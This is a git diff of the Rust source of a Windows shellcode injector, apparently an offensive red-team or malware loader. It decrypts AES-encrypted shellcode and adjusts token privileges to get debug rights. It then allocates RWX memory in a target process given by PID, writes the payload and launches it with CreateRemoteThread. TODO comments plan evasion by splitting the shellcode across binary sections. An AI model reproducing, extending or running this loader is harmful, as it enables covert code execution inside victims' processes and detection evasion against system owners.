@@ -1,4 +1,6 @@
 
+use std::thread::current;
+
 use libaes::Cipher;
 
 // Importing shellcode variables from shellcode.rs
@@ -23,6 +25,15 @@ impl EncryptedShellcode<'_> {
 }
 
 
+// TODO:
+
+// Clean up DebugPrivilege check
+// first check if we're running with admin perms or not, if we are, try to inject without the debugpriv.
+// if it doesn't work, get debug priv and then acquire a handle.
+// syscall debugpriv fetch?
+// Move shellcode to different sections inside the binary, so it's split up.
+
+
 
 // The current execution flow idea is as follows:
 // This program starts, it sleeps for 30 seconds.
@@ -33,23 +44,23 @@ impl EncryptedShellcode<'_> {
 // Now, after sleeping for 10 seconds, this will turn the page to EXECUTE
 // and start the thread execution. Now, we close the handle(s) and continue our lives.
 
+
+// Debug run: $notepadProcess = Start-Process -FilePath "notepad.exe" -PassThru ; cargo run -- $notepadProcess.Id
+
 fn main() {
+
+
     let encrypted_payload = EncryptedShellcode{
         shellcode: SHELLCODE, 
         key: KEY, 
         iv: INITVEC
     };
     let payload = encrypted_payload.decrypt();
-    /*
-    let pids = enumerate_processes().unwrap();
-    let current_process_pid = pids.last().unwrap();
-    //let args: Vec<String> = env::args().collect();
-    */
+    
     let args: Vec<String> = std::env::args().collect();
-
     // Ensure at least one argument (the program name) is provided
     if args.len() < 2 {
-        println!("Usage: {} <number>", args[0]);
+        println!("Usage: {} <pid>", args[0]);
         return;
     }
 
@@ -60,16 +71,32 @@ fn main() {
             println!("Error: Invalid input! Defaulting to 0.");
             0
         }
-    };    let mut current_process = WindowsProcess::from_pid(target_pid);
-    // Now, technically we shouldn't need to fetch a handle, as it'll do it automatically.
+    };
+    let pids = enumerate_processes().unwrap();
+    let own_pid = pids.last().unwrap();
+    
+    let mut current_process = WindowsProcess::from_pid(target_pid);
+    let mut own_process = WindowsProcess::from_pid(*own_pid);
+    own_process.get_handle();
+
+    // Whatever the fuck this is:
+    let token = get_token_handle(*own_process.handle.unwrap()).unwrap();
+    
+    adjust_token_privileges(token);
+
+    match current_process.get_handle(){
+        Ok(_) => println!("[+] Acquired handle."),
+        Err(e) => panic!("[!] Failure acquiring handle!\n -> {:#x}", e.0),
+    }
+
     let address_start = match current_process.virtual_alloc(
         None, 
-        Some(0x04),
+        Some(0x40),
         Some(payload.len()),
         None
     ) {
         Ok(address)  => { 
-            println!("[+] VirtualAlloc succeeded."); 
+            println!("[+] VirtualAlloc succeeded.\n -> {:?}", address); 
             address
         },
         Err(e) => panic!("[!] VirtualAlloc error!\n-> {:#x}", e.0),
@@ -81,15 +108,8 @@ fn main() {
         Ok(_) => println!("[+] WriteProcessMemory succeeded."),
         Err(e) => eprintln!("[!] WriteProcessMemory error!\n-> {:#x}", e.0),
     }
+    let mem = current_process.read_process_memory(address_start as usize, payload.len()).unwrap().0;
 
-    match current_process.virtual_protect(
-        address_start, 
-        payload.len(), 
-        0x10
-    ){
-        Ok(_) => println!("[+] VirtualProtectEx succeeded."),
-        Err(e) => eprintln!("[!] VirtualProtectEx error!\n-> {:#x}", e.0),
-    }
     match current_process.create_remote_thread_ex(
         address_start
     ){
@@ -97,8 +117,5 @@ fn main() {
         Err(e) => eprintln!("[!] CreateRemoteThread error!\n-> {:#x}", e.0),
     }
     // This is used to test that the thread does spawn, as the process terminates too quickly otherwise.
-    use std::{thread, time};
-    let ten_millis = time::Duration::from_millis(100);
-    thread::sleep(ten_millis);
 
 }
